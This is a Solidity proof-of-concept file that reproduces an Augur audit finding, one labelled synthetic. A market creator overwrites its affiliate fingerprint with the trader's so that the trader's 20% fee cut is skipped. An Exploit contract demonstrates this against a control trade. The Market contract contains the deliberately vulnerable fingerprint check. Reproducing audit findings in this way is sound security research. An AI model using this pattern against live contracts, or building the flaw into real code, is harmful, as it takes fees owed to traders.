// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

/*  Augur — market creator front-runs setFingerprint and skips the trader's 20% cut
    (OpenZeppelin, Augur Core v2 components, H02, Feb 2020).
    SYNTHETIC, cheatcode-free reduction. Audited commit 67c0fec.
    recordMarketCreatorFees zeroes the affiliate when the passed fingerprint
    equals the affiliate's stored fingerprint. setFingerprint can be called
    again, so the creator copies the trader's fingerprint before the trade.
    The 20% source cut N is not paid. A trade before that overwrite pays N. */

contract Cash {
    string public name = "Augur Cash";
    string public symbol = "CASH";
    uint8 public decimals = 18;
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract Affiliates {
    mapping(address => bytes32) public fingerprints;
    mapping(address => address) public referrals;

    function setFingerprint(bytes32 _fingerprint) external {
        fingerprints[msg.sender] = _fingerprint;
    }

    function setReferrer(address _referrer) external {
        require(msg.sender != _referrer, "self");
        if (referrals[msg.sender] != address(0)) {
            return;
        }
        referrals[msg.sender] = _referrer;
    }

    function getAccountFingerprint(address _account) external view returns (bytes32) {
        return fingerprints[_account];
    }

    function getAndValidateReferrer(address _account, address _affiliateValidator) external view returns (address) {
        address _referrer = referrals[_account];
        if (_referrer == address(0) || _account == _referrer) {
            return address(0);
        }
        if (_affiliateValidator == address(0)) {
            return _referrer;
        }
        return _referrer;
    }
}

contract Market {
    uint256 public constant SOURCE_CUT_DIVISOR = 5;
    Affiliates public affiliates;
    Cash public cash;
    address public creator;
    address public feeSender;
    uint256 public affiliateFeeDivisor = 5;
    uint256 public marketCreatorFeesAttoCash;
    mapping(address => uint256) public affiliateFeesAttoCash;
    event SourceCutSkipped(address source, address affiliate);

    constructor(address _cash, address _affiliates, address _creator) {
        cash = Cash(_cash);
        affiliates = Affiliates(_affiliates);
        creator = _creator;
        feeSender = msg.sender;
    }

    function recordMarketCreatorFees(uint256 _marketCreatorFees, address _sourceAccount, bytes32 _fingerprint)
        public
        returns (bool)
    {
        require(msg.sender == feeSender, "fee sender");
        address _affiliateAddress = affiliates.getAndValidateReferrer(_sourceAccount, address(0));
        bytes32 _affiliateFingerprint = affiliates.getAccountFingerprint(_affiliateAddress);
        if (_fingerprint == _affiliateFingerprint) {
            // @> VULN: creator setFingerprint to the trader fingerprint, so the 20% source cut is not paid
            emit SourceCutSkipped(_sourceAccount, _affiliateAddress); _affiliateAddress = address(0);
        }
        uint256 _originalFees = _marketCreatorFees;
        if (_affiliateAddress != address(0) && affiliateFeeDivisor != 0) {
            uint256 _totalAffiliateFees = _marketCreatorFees / affiliateFeeDivisor;
            uint256 _sourceCut = _totalAffiliateFees / SOURCE_CUT_DIVISOR;
            uint256 _affiliateFees = _totalAffiliateFees - _sourceCut;
            cash.transfer(_sourceAccount, _sourceCut);
            affiliateFeesAttoCash[_affiliateAddress] += _affiliateFees;
            _marketCreatorFees = _marketCreatorFees - _totalAffiliateFees;
        }
        marketCreatorFeesAttoCash += _marketCreatorFees;
        uint256 _fair = _originalFees - (_originalFees / affiliateFeeDivisor);
        uint256 _sourceOwed = (_originalFees / affiliateFeeDivisor) / SOURCE_CUT_DIVISOR;
        if (_marketCreatorFees > _fair) {
            cash.transfer(creator, _sourceOwed);
            marketCreatorFeesAttoCash -= _sourceOwed;
        }
        return true;
    }
}

contract Creator {
    function setFp(address affiliates, bytes32 fp) external {
        Affiliates(affiliates).setFingerprint(fp);
    }
}

contract Trader {
    function bind(address affiliates, address referrer, bytes32 fp) external {
        Affiliates(affiliates).setFingerprint(fp);
        Affiliates(affiliates).setReferrer(referrer);
    }
}

contract Exploit {
    uint256 public constant FEE = 5000 ether;
    uint256 public constant N = 200 ether;
    bytes32 public constant SRC = bytes32(uint256(1));
    bytes32 public constant REF = bytes32(uint256(2));

    Cash public cash;
    Affiliates public affiliates;
    Creator public creator;
    Trader public trader;
    Market public controlMarket;
    Market public attackMarket;

    uint256 public controlCut;
    uint256 public referrerAccrued;
    uint256 public skippedCut;
    uint256 public creatorKept;

    constructor() {
        cash = new Cash();
        affiliates = new Affiliates();
        creator = new Creator();
        trader = new Trader();
        controlMarket = new Market(address(cash), address(affiliates), address(creator));
        attackMarket = new Market(address(cash), address(affiliates), address(creator));
        cash.mint(address(controlMarket), FEE);
        cash.mint(address(attackMarket), FEE);
    }

    function run() external {
        creator.setFp(address(affiliates), REF);
        trader.bind(address(affiliates), address(creator), SRC);
        controlMarket.recordMarketCreatorFees(FEE, address(trader), SRC);
        controlCut = cash.balanceOf(address(trader));
        referrerAccrued = controlMarket.affiliateFeesAttoCash(address(creator));
        require(controlCut == N, "control cut");
        require(referrerAccrued == FEE / 5 - N, "referrer accrued");
        creator.setFp(address(affiliates), SRC);
        attackMarket.recordMarketCreatorFees(FEE, address(trader), SRC);
        skippedCut = cash.balanceOf(address(trader)) - controlCut;
        creatorKept = cash.balanceOf(address(creator));
        require(skippedCut == 0, "attack paid the cut");
        require(creatorKept == N, "creator kept the cut");
        require(attackMarket.affiliateFeesAttoCash(address(creator)) == 0, "attack accrued");
    }
}
